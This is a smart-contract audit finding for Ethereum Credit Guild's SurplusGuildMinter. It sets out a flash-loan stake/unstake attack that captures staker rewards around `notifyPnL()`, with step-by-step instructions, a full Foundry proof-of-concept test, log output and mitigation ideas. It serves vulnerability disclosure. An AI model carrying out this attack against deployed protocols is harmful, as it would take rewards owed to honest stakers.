# Original link
https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/994
# Lines of code

https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L114-L155
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L158-L212
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L216-L290


# Vulnerability details

## Impact

A malicious borrower can reduce all Guild holders’ rewards with a big flashloan, upon full repayment.

Borrower opens a loan with the minimum borrowable amount in term with no mandatory partial repayment. Wait for the loan to accumulate interest, then transfer the funds to an alternative account - EXPLOITER. EXPLOITER takes a flash loan, stakes the amount through `SurplusGuildMinter`, repays the original loan, lowering the rewards for all other GUILD holders by increasing the `_gaugeWeight` with his staked tokens. Afterward, the EXPLOITER unstakes and returns the flashloan. 

The attacker ends up with his collateral, his loan repaid, credit reward and a big percentage of the reward intended for `GUILD` holders since he is the largest staker for this term at the time of the attack. He receives significant credit and guild rewards as a staker, which is incorrect because he was a staker only for that specific transaction.

He only pays the unavoidable interest payment, typically around $4-5, along with gas costs in the scenario described below.

> ***NOTE:*** *The attack can be simplified further by having a substantial amount of tokens and bypassing the flashloan step. By frontrunning the `notifyPnL()` function with a `stake()`, followed by a backrun with an `unstake()`, this way the attacker can instantly accumulate rewards without being a long-term staker like others in the system.*
> 

## Proof of Concept

The exploiter has two accounts:

- **ALICE account:** This is used to borrow a loan, which the exploiter, will later repay to trigger the `notifyPnL()`.
- **EXPLOITER account:** This account is used to obtain a flash loan, then staked the amount into the same term. This action is designed to deflate rewards for other participants in the system.

> ***Prerequisites**: The exploiter requires approximately $10 balance before the attack to cover the loan interest.*
> 

Here are the detailed steps to execute the described attack:

1. Alice borrows 100 gUSDC.
2. Transfers the borrowed gUSDC to the EXPLOITER account.
3. Waits for 150 days to accumulate interest on the loan. (waiting period can also be shorter, for just 10 days the impact will be slightly lower → 4 decimals less removed from the stakers rewards)
4. EXPLOITER obtains a USDC flash loan.
5. Mints gUSDC through `PSM`.
6. Stakes the minted gUSDC into the same term using SurplusGuildMinter.
7. Repays Alice's position, triggering `notifyPnL()`.
8. `notifyPnL()` updates the `_gaugeProfitIndex`, reducing rewards for other Guild holders.
9. EXPLOITER unstakes.
10. Redeems USDC through PSM.
11. Returns the flash loan.

### Coded PoC

Create new file in `test/unit/loan` called `DeflateGuildHoldersRewards.t.sol`

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.13;

import {Test, console} from "@forge-std/Test.sol";
import {Core} from "@src/core/Core.sol";
import {CoreRoles} from "@src/core/CoreRoles.sol";
import {GuildToken} from "@src/tokens/GuildToken.sol";
import {CreditToken} from "@src/tokens/CreditToken.sol";
import {ProfitManager} from "@src/governance/ProfitManager.sol";
import {MockLendingTerm} from "@test/mock/MockLendingTerm.sol";
import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
import {SurplusGuildMinter} from "@src/loan/SurplusGuildMinter.sol";

contract DeflateGuildHoldersRewardsUnitTest is Test {
    address private governor = address(1);
    address private guardian = address(2);
    address private ALICE = makeAddr("alice");
    address private EXPLOITER = makeAddr("exploiter");
    address private STAKER1 = makeAddr("staker1");
    address private STAKER2 = makeAddr("staker2");
    address private STAKER3 = makeAddr("staker3");
    address private termUSDC;
    Core private core;
    ProfitManager private profitManagerUSDC;
    CreditToken gUSDC;
    GuildToken guild;
    RateLimitedMinter rlgm;
    SurplusGuildMinter sgmUSDC;

    // GuildMinter params
    uint256 constant MINT_RATIO = 2e18;
    uint256 constant REWARD_RATIO = 5e18;

    function setUp() public {
        vm.warp(1679067867);
        vm.roll(16848497);
        core = new Core();

        profitManagerUSDC = new ProfitManager(address(core));
        gUSDC = new CreditToken(address(core), "gUSDC", "gUSDC");
        guild = new GuildToken(address(core), address(profitManagerUSDC));
        rlgm = new RateLimitedMinter(
            address(core), /*_core*/
            address(guild), /*_token*/
            CoreRoles.RATE_LIMITED_GUILD_MINTER, /*_role*/
            type(uint256).max, /*_maxRateLimitPerSecond*/
            type(uint128).max, /*_rateLimitPerSecond*/
            type(uint128).max /*_bufferCap*/
        );
        sgmUSDC = new SurplusGuildMinter(
            address(core),
            address(profitManagerUSDC),
            address(gUSDC),
            address(guild),
            address(rlgm),
            MINT_RATIO,
            REWARD_RATIO
        );
        profitManagerUSDC.initializeReferences(address(gUSDC), address(guild), address(0));
        termUSDC = address(new MockLendingTerm(address(core)));

        // roles
        core.grantRole(CoreRoles.GOVERNOR, governor);
        core.grantRole(CoreRoles.GUARDIAN, guardian);
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(rlgm));
        core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmUSDC));
        core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmUSDC));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
        core.renounceRole(CoreRoles.GOVERNOR, address(this));

        guild.setMaxGauges(10);
        guild.addGauge(1, termUSDC);

        // labels
        vm.label(address(core), "core");
        vm.label(address(profitManagerUSDC), "profitManagerUSDC");
        vm.label(address(gUSDC), "gUSDC");
        vm.label(address(guild), "guild");
        vm.label(address(rlgm), "rlcgm");
        vm.label(address(sgmUSDC), "sgmUSDC");
        vm.label(termUSDC, "termUSDC");
    }

    function testGuildHoldersRewardsWithoutEXPLOITER() public {
        // 3 users borrow gUSDC and stake them into the gUSDC term
        // In reality there may be more users, but for testing purposes, three are sufficient.
        gUSDC.mint(STAKER1, 200e18);
        gUSDC.mint(STAKER2, 800e18);
        gUSDC.mint(STAKER3, 600e18);

        vm.startPrank(STAKER1);
        gUSDC.approve(address(sgmUSDC), 200e18);
        sgmUSDC.stake(termUSDC, 200e18);
        vm.stopPrank();

        vm.startPrank(STAKER2);
        gUSDC.approve(address(sgmUSDC), 800e18);
        sgmUSDC.stake(termUSDC, 800e18);
        vm.stopPrank();

        vm.startPrank(STAKER3);
        gUSDC.approve(address(sgmUSDC), 600e18);
        sgmUSDC.stake(termUSDC, 600e18);
        vm.stopPrank();

        // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.
        uint borrowTime = block.timestamp;
        gUSDC.mint(ALICE, 100e18);

    	vm.warp(block.timestamp + 150 days);
        uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);
        vm.prank(governor);
        profitManagerUSDC.setProfitSharingConfig(
            0.05e18, // surplusBufferSplit
            0.9e18, // creditSplit
            0.05e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        gUSDC.mint(address(profitManagerUSDC), interest);
        profitManagerUSDC.notifyPnL(termUSDC, int256(interest));

        sgmUSDC.getRewards(STAKER1, termUSDC);
        sgmUSDC.getRewards(STAKER2, termUSDC);
        sgmUSDC.getRewards(STAKER3, termUSDC);
        console.log("------------------------------BEFORE ATTACK------------------------------");
        console.log("Staker1 credit reward:                                  ", gUSDC.balanceOf(address(STAKER1)));
        console.log("Staker1 guild reward:                                  ", guild.balanceOf(address(STAKER1)));
        console.log("Staker2 credit reward:                                 ", gUSDC.balanceOf(address(STAKER2)));
        console.log("Staker2 guild reward:                                  ", guild.balanceOf(address(STAKER2)));
        console.log("Staker3 credit reward:                                  ", gUSDC.balanceOf(address(STAKER3)));
        console.log("Staker3 guild reward:                                  ", guild.balanceOf(address(STAKER3)));
        console.log("GaugeProfitIndex:                                     ", profitManagerUSDC.gaugeProfitIndex(termUSDC));
    }

    function testGuildHoldersRewardsAfterEXPLOITER() public {
        gUSDC.mint(STAKER1, 200e18);
        gUSDC.mint(STAKER2, 800e18);
        gUSDC.mint(STAKER3, 600e18);

        vm.startPrank(STAKER1);
        gUSDC.approve(address(sgmUSDC), 200e18);
        sgmUSDC.stake(termUSDC, 200e18);
        vm.stopPrank();

        vm.startPrank(STAKER2);
        gUSDC.approve(address(sgmUSDC), 800e18);
        sgmUSDC.stake(termUSDC, 800e18);
        vm.stopPrank();

        vm.startPrank(STAKER3);
        gUSDC.approve(address(sgmUSDC), 600e18);
        sgmUSDC.stake(termUSDC, 600e18);
        vm.stopPrank();

        // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.
        uint borrowTime = block.timestamp;
        gUSDC.mint(ALICE, 100e18);

        // NOTE: Alice needs to transfer the borrowed 100e18 gUSDC to EXPLOITER for repayment.

        
        console.log("-------------------------------AFTER ATTACK-------------------------------");
        console.log("EXPLOITER Credit Balance before flashloan:                              ", gUSDC.balanceOf(EXPLOITER));
        // EXPLOITER gets a flashloan.
        gUSDC.mint(EXPLOITER, 10_000_000e18);
        console.log("EXPLOITER Credit Balance after flashloan:      ", gUSDC.balanceOf(EXPLOITER));
        vm.startPrank(EXPLOITER);
        gUSDC.approve(address(sgmUSDC), 10_000_000e18);
        sgmUSDC.stake(termUSDC, 10_000_000e18);
        console.log("EXPLOITER Credit balance after stake:                                   ", gUSDC.balanceOf(EXPLOITER));
        vm.stopPrank();

    	vm.warp(block.timestamp + 150 days);
        uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);
        vm.prank(governor);
        profitManagerUSDC.setProfitSharingConfig(
            0.05e18, // surplusBufferSplit
            0.9e18, // creditSplit
            0.05e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        profitManagerUSDC.notifyPnL(termUSDC, int256(interest));
        
        sgmUSDC.getRewards(EXPLOITER, termUSDC);
        console.log("EXPLOITER (instant) Credit reward:                     ", gUSDC.balanceOf(address(EXPLOITER)));
        console.log("EXPLOITER (instant) Guild reward:                     ", guild.balanceOf(address(EXPLOITER)));
        //EXPLOITER's profit is based on the guild split since he own almost all of the GUILD totalSupply.

        vm.startPrank(EXPLOITER);
        sgmUSDC.unstake(termUSDC, 10_000_000e18);
        vm.stopPrank();

        console.log("EXPLOITER credit balance after unstake:        ", gUSDC.balanceOf(EXPLOITER));

        // NOTE: EXPLOITER repays the flash loan here.

        sgmUSDC.getRewards(STAKER1, termUSDC);
        sgmUSDC.getRewards(STAKER2, termUSDC);
        sgmUSDC.getRewards(STAKER3, termUSDC);
        console.log("Staker1 credit reward:                                      ", gUSDC.balanceOf(address(STAKER1)));
        console.log("Staker1 guild reward:                                      ", guild.balanceOf(address(STAKER1)));
        console.log("Staker2 credit reward:                                     ", gUSDC.balanceOf(address(STAKER2)));
        console.log("Staker2 guild reward:                                      ", guild.balanceOf(address(STAKER2)));
        console.log("Staker3 credit reward:                                     ", gUSDC.balanceOf(address(STAKER3)));
        console.log("Staker3 guild reward:                                      ", guild.balanceOf(address(STAKER3)));
        console.log("GaugeProfitIndex:                                     ", profitManagerUSDC.gaugeProfitIndex(termUSDC));
    }

    // Function that will compute Alice's interest with which notifyPnL will be called so that the attack is as accurate as possible
    function _computeAliceLoanInterest(uint borrowTime, uint borrowAmount) private view returns (uint interest) {
        uint256 _INTEREST_RATE = 0.10e18; // 10% APR --- from LendingTerm tests
        uint256 YEAR = 31557600;

        interest = (borrowAmount * _INTEREST_RATE * (block.timestamp - borrowTime)) / YEAR / 1e18;
    }
}
```

There are tests for both cases – one without the attack and another with the attack scenario.

Run them with:

```solidity
forge test --match-contract "DeflateGuildHoldersRewardsUnitTest" --match-test "testGuildHoldersRewards" -vvv
```

```solidity
Logs:
  -------------------------------AFTER ATTACK-------------------------------
  EXPLOITER Credit Balance before flashloan:                               0
  EXPLOITER Credit Balance after flashloan:       10000000000000000000000000
  EXPLOITER Credit balance after stake:                                    0
  EXPLOITER (instant) Credit reward:                      205305960080000000
  EXPLOITER (instant) Guild reward:                      1026529800400000000
  EXPLOITER credit balance after unstake:         10000000205305960080000000
  Staker1 credit reward:                                       4106119201600
  Staker1 guild reward:                                       20530596008000
  Staker2 credit reward:                                      16424476806400
  Staker2 guild reward:                                       82122384032000
  Staker3 credit reward:                                      12318357604800
  Staker3 guild reward:                                       61591788024000
  GaugeProfitIndex:                                      1000000010265298004

Logs:
  ------------------------------BEFORE ATTACK------------------------------
  Staker1 credit reward:                                   25667351129363200
  Staker1 guild reward:                                   128336755646816000
  Staker2 credit reward:                                  102669404517452800
  Staker2 guild reward:                                   513347022587264000
  Staker3 credit reward:                                   77002053388089600
  Staker3 guild reward:                                   385010266940448000
  GaugeProfitIndex:                                      1000064168377823408
```

## Tools Used

Manual

## Recommended Mitigation Steps

Providing recommendations is challenging due to the large codebase, and code changes might affect other parts of the system.

The things we came up with to protect against this are: to not allow staking and unstaking in the same block, implementing staking/unstaking fee, or implementing a "warm-up period" during which stakers are unable to accumulate interest.

We are open to collaborate with the development team to find a proper mitigation for the problem.


## Assessed type

Context